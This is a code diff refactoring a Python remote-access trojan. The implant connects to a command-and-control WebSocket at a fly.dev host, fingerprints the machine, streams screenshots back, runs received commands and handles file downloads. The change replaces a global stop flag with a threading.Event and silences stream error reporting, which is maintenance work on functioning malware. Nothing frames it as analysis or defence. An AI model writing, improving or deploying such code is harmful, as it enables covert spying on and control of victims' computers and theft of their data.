@@ -17,7 +17,7 @@ CURRENT_CWD = os.getcwd()
 C2_URL = "wss://textgame-9-c2.fly.dev/shell"
 SESSION_ID = "rs-" + socket.gethostname() + "-" + str(int(time.time()))
 
-STREAM_ACTIVE = False
+STREAM_EVENT = threading.Event()
 
 def send(ws, obj):
     try:
@@ -34,10 +34,9 @@ def fingerprint():
     }
 
 def stream_screen(ws):
-    global STREAM_ACTIVE
-    STREAM_ACTIVE = True
+    STREAM_EVENT.clear()
     try:
-        while STREAM_ACTIVE:
+        while not STREAM_EVENT.is_set():
             screenshot = pyautogui.screenshot()
             frame = np.array(screenshot)
             frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
@@ -47,9 +46,8 @@ def stream_screen(ws):
             send(ws, {"t": "reply", "data": f"[STREAM] {b64}"})
             time.sleep(0.1) # ~10 FPS
     except Exception as e:
-        send(ws, {"t": "reply", "data": f"[-] Stream error: {e}\n"})
+        pass
     finally:
-        STREAM_ACTIVE = False
         send(ws, {"t": "reply", "data": "[-] Stream stopped.\n"})
 
 def run_cmd(ws, cmd):
@@ -138,7 +136,6 @@ def do_download(ws, path):
         send(ws, {"t": "download", "path": path, "error": str(e)})
 
 def main():
-    global STREAM_ACTIVE
     while True:
         try:
             ws = websocket.create_connection(C2_URL, timeout=30)
@@ -156,9 +153,9 @@ def main():
                 if t == "cmd":
                     cmd = frame.get("cmd", "")
                     if "stopstream" in cmd:
-                        STREAM_ACTIVE = False
+                        STREAM_EVENT.set()
                     elif "stream" in cmd:
-                        STREAM_ACTIVE = False
+                        STREAM_EVENT.set()
                         time.sleep(0.2)
                         threading.Thread(target=stream_screen, args=(ws,), daemon=True).start()
                     elif "screenshot" in cmd:
